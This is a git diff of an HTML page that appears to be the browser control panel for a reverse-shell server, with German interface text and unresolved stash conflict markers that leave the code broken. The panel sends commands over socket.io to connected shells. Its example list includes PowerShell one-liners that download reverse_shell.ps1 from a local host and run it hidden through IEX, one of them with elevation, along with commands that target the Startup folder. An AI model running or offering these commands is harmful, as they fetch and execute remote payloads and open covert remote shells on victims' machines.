@@ -154,6 +154,7 @@ height: 0px;
   </style>
 
   <script type="text/javascript">
+<<<<<<< Updated upstream
     $(document).ready(()=>{
     	$('.examples li').click((a)=>{
         var command = a.target.innerText
@@ -172,6 +173,13 @@ height: 0px;
       })
 
 
+=======
+$(document).ready(()=>{
+	$('.examples li').click((a)=>{
+var command = a.target.innerText
+$('.shell.active input')[0].value = command
+})
+>>>>>>> Stashed changes
 })
 
 function toggleExamples(){
@@ -201,6 +209,7 @@ $('.examples').removeClass('hidden');
       }
     }
 
+<<<<<<< Updated upstream
 
       function sendCommand(id){
         command = $('.shell#'+id+' .inputcontainer input')[0].value
@@ -212,11 +221,23 @@ $('.examples').removeClass('hidden');
       var host = window.location.hostname
       const socket = io(host);
       console.log('Connecting to WebSocket at '+host);
+=======
+    function sendCommand(id){
+      command = $('.shell#'+id+' .inputcontainer input')[0].value
+	if(command == '') return;
+      $('.shell#'+id+' .inputcontainer input')[0].value = ""
+      socket.emit('command', {'command': command, 'id': id})
+    }
+var host = window.location.hostname
+      const socket = io(host);
+console.log('Connecting to WebSocket at '+host);
+>>>>>>> Stashed changes
 
       socket.on('new shell', (id)=>{
         addShell(id)
       })
 
+<<<<<<< Updated upstream
       socket.on('close', (id)=>{
         //alert('socket closed')
         $('.shell#'+id).remove()
@@ -236,12 +257,38 @@ $('.examples').removeClass('hidden');
         $('.shell#'+data.id+' .responsecontainer').append('<p class="command">> '+data.command+'</p>')
         var elem = $('.shell#'+data.id+' .responsecontainer')[0]
         elem.scrollTop = elem.scrollHeight
+=======
+socket.on('close', (id)=>{
+//alert('socket closed')
+$('.shell#'+id).remove()
+$(".tabbuttoncontainer label[for='"+id+"']").remove()
+
+
+if(!$('.shellcontainer .shell')[0]){
+$('.noshelloverlay').removeClass('hidden')
+}else if(!$('.shell.active')[0]){
+$('.shell').first().addClass('active')
+$('.tabbuttoncontainer input').first()[0].checked = true;
+}
+
+})
+
+      socket.on('command', (data)=>{
+        $('.shell#'+data.id+' .responsecontainer').append('<p class="command">> '+data.command+'</p>')
+var elem = $('.shell#'+data.id+' .responsecontainer')[0]
+elem.scrollTop = elem.scrollHeight
+>>>>>>> Stashed changes
       })
 
       socket.on('response', (data)=>{
         $('.shell#'+data.id+' .responsecontainer').append('<p class="response">'+data.response+'</p>')
+<<<<<<< Updated upstream
         var elem = $('.shell#'+data.id+' .responsecontainer')[0]
         elem.scrollTop = elem.scrollHeight
+=======
+var elem = $('.shell#'+data.id+' .responsecontainer')[0]
+elem.scrollTop = elem.scrollHeight
+>>>>>>> Stashed changes
       })
 
       socket.on('disconnect', ()=>{
@@ -250,13 +297,17 @@ $('.examples').removeClass('hidden');
         $('.noshelloverlay').removeClass('hidden')
         console.log('Verbindung unterbrochen')
       })
+<<<<<<< Updated upstream
 
 
+=======
+>>>>>>> Stashed changes
   </script>
 </head>
 <body>
   <div class="tabbuttoncontainer"></div>
   <div class="shellcontainer"></div>
+<<<<<<< Updated upstream
   <div class="examples">
     <ul>
       <li style="color:#fff">cd 'C:\Users\testo\Desktop'</li>
@@ -277,6 +328,25 @@ $('.examples').removeClass('hidden');
       <li style="color:#f1c">Stop-computer</li>
     </ul>
   </div>
+=======
+<div class="examples">
+<ul>
+<li style="color:#fff">cd 'C:\Users\testo\Desktop'</li>
+<li style="color:#fff">cd "C:\Users\testo\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"</li>
+<li style="color:#aaa">dir</li>
+<li style="color:#00f">Get-Location</li>
+<li style="color:#0af">mkdir Ordnername</li>
+<li style="color:#3c4">del Dateiname</li>
+<li style="color:#fd0">Start-Process explorer.exe -ArgumentList "C:\Users\testo\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"</li>
+<li style="color:#fd0">Start-Process chrome.exe -ArgumentList "http://raspberrypi.local/hacking"</li>
+<li style="color:#f82">Stop-Process -name chrome</li>
+<li style="color:#f82">Get-Process | Where {$_.MainWindowTitle -like "Autostart"} | Stop-Process</li>
+<li style="color:#f43">WGET "http://raspberrypi.local/files/reverse_shell.ps1" -UseBasicParsing -OutFile "reverse-shell.ps1"</li>
+<li style="color:#f1c">Start-Process powershell.exe -ArgumentList "IEX (New-Object Net.WebClient).DownloadString('http://raspberrypi.local/files/reverse_shell.ps1');" -WindowStyle Hidden; exit</li>
+<li style="color:#f1c">Start-Process powershell.exe -ArgumentList "IEX (New-Object Net.Webclient).DownloadString('http://raspberrypi.local/files/reverse_shell.ps1');" -WindowStyle Hidden -verb runas; exit</li>
+</ul>
+</div>
+>>>>>>> Stashed changes
   <div class="noshelloverlay"><span>Keine offene Reverse-Shell-Verbindung gefunden</span></div>
 </body>
 </html>
